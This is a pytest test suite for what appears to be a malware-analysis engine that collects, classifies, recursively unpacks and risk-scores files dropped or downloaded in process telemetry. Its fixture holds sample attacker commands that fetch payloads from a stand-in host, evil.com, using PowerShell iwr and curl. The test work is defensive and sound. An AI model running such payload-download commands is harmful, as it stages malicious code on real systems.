import os
import tempfile
import zipfile
import pytest
import shutil
from unittest.mock import patch, MagicMock

from app.analysis.artifact_engine import (
    ArtifactCollector,
    ArtifactClassifier,
    RecursiveAnalyzer,
    ArchiveExpander,
    DownloadDetector,
    ArtifactEngine,
    ArtifactResult
)
from app.analysis.risk_engine_v2 import RiskEngineV2
from app.analysis.models import RiskAssessment

# --- Test Data & Fixtures ---

@pytest.fixture
def temp_workspace():
    workspace = tempfile.mkdtemp()
    yield workspace
    shutil.rmtree(workspace, ignore_errors=True)

@pytest.fixture
def sample_telemetry(temp_workspace):
    file1 = os.path.join(temp_workspace, "dropped.exe")
    with open(file1, "wb") as f:
        f.write(b"MZ" + b"\x00" * 1024)
        
    file2 = os.path.join(temp_workspace, "payload.zip")
    with open(file2, "wb") as f:
        f.write(b"PK\x03\x04" + b"\x00" * 100)
        
    return [
        {
            "type": "FILE_WRITE",
            "timestamp": "2026-06-13T12:00:00Z",
            "data": {
                "path": file1,
                "size": 1026,
                "sha256": "fake_hash_1",
                "cmdline": "loader.exe /drop"
            }
        },
        {
            "type": "HTTP_DOWNLOAD",
            "timestamp": "2026-06-13T12:00:01Z",
            "data": {
                "url": "http://evil.com/payload.zip",
                "destination": file2,
                "size": 104,
                "sha256": "fake_hash_2",
                "cmdline": "powershell -c iwr http://evil.com/payload.zip -o payload.zip"
            }
        },
        {
            "type": "PROCESS_CREATE",
            "timestamp": "2026-06-13T12:00:02Z",
            "data": {
                "cmdline": "curl -O http://evil.com/stage2.bin"
            }
        }
    ]

# --- Phase 1 & 5 Tests ---

def test_artifact_collector(sample_telemetry):
    artifacts = ArtifactCollector.collect(sample_telemetry)
    assert len(artifacts) == 2
    
    dropped = [a for a in artifacts if a.relationship == "dropped"]
    downloaded = [a for a in artifacts if a.relationship == "downloaded"]
    
    assert len(dropped) == 1
    assert "dropped.exe" in dropped[0].path
    assert dropped[0].process == "loader.exe /drop"
    
    assert len(downloaded) == 1
    assert "payload.zip" in downloaded[0].path
    assert downloaded[0].source_url == "http://evil.com/payload.zip"

def test_download_detector(sample_telemetry):
    downloads = DownloadDetector.detect(sample_telemetry)
    # 1 explicit HTTP_DOWNLOAD, 1 inferred from curl
    assert len(downloads) == 2
    urls = [d.source_url for d in downloads]
    assert "http://evil.com/payload.zip" in urls
    assert "http://evil.com/stage2.bin" in urls

# --- Phase 2 Tests ---

def test_artifact_classifier_pe(temp_workspace):
    pe_file = os.path.join(temp_workspace, "test.exe")
    with open(pe_file, "wb") as f:
        f.write(b"MZ" + b"\x00" * 1024)
        
    result = ArtifactClassifier.classify(pe_file)
    assert result["type"] == "Executable"
    assert result["executable"] is True

def test_artifact_classifier_script(temp_workspace):
    script_file = os.path.join(temp_workspace, "test.ps1")
    with open(script_file, "w") as f:
        f.write("Write-Host 'Hello World'")
        
    result = ArtifactClassifier.classify(script_file)
    assert result["type"] == "Script"
    assert result["suspicious"] is True  # scripts are flagged

# --- Phase 3 & 4 Tests ---

@patch("app.analysis.artifact_engine.RecursiveAnalyzer._run_static_analysis", return_value={})
@patch("app.analysis.artifact_engine.RecursiveAnalyzer._run_yara", return_value=["Malware.Test"])
def test_recursive_analyzer_and_archive(mock_yara, mock_static, temp_workspace):
    # Create a zip file containing an exe
    zip_path = os.path.join(temp_workspace, "test.zip")
    exe_content = b"MZ" + b"\x90" * 50
    
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("inner.exe", exe_content)
        
    analyzer = RecursiveAnalyzer()
    result = analyzer.analyze(zip_path)
    
    assert result is not None
    assert result.file_type == "Archive"
    assert len(result.children) == 1
    
    child = result.children[0]
    assert child.filename == "inner.exe"
    assert child.file_type == "Executable"
    assert child.relationship == "extracted"
    assert "Malware.Test" in child.yara_matches
    assert child.risk_score > 0

# --- Phase 7 Tests ---

def test_risk_propagation():
    # Base parent assessment
    parent = RiskAssessment(
        score=20,
        severity="LOW",
        confidence=80,
        verdict="Benign",
        score_breakdown={},
        reasoning=["Test parent"]
    )
    
    # Child with high risk (95)
    # 95 * 0.9 = 85
    elevated = RiskEngineV2.propagate_artifact_risk(parent, 95)
    
    assert elevated.score == 85
    assert elevated.severity == "CRITICAL"
    assert len(elevated.reasoning) == 2
    assert "Risk elevated" in elevated.reasoning[-1]
    
    # Child with low risk (10)
    parent.score = 50
    parent.severity = "MEDIUM"
    elevated2 = RiskEngineV2.propagate_artifact_risk(parent, 10)
    
    assert elevated2.score == 50
    assert elevated2.severity == "MEDIUM"

# --- Phase 6-9 Orchestrator Tests ---

@patch("app.analysis.artifact_engine.RecursiveAnalyzer.analyze")
def test_artifact_engine_process(mock_analyze, sample_telemetry):
    # Mock the analyzer to return stub results
    def side_effect(file_path, **kwargs):
        return ArtifactResult(
            filename=os.path.basename(file_path),
            risk_score=60,
            children=[]
        )
    mock_analyze.side_effect = side_effect
    
    engine = ArtifactEngine()
    report = engine.process(sample_telemetry)
    
    assert report["artifact_count"] == 2
    assert report["download_count"] == 2
    assert report["max_child_risk"] == 60
    assert len(report["artifact_tree"]) == 2
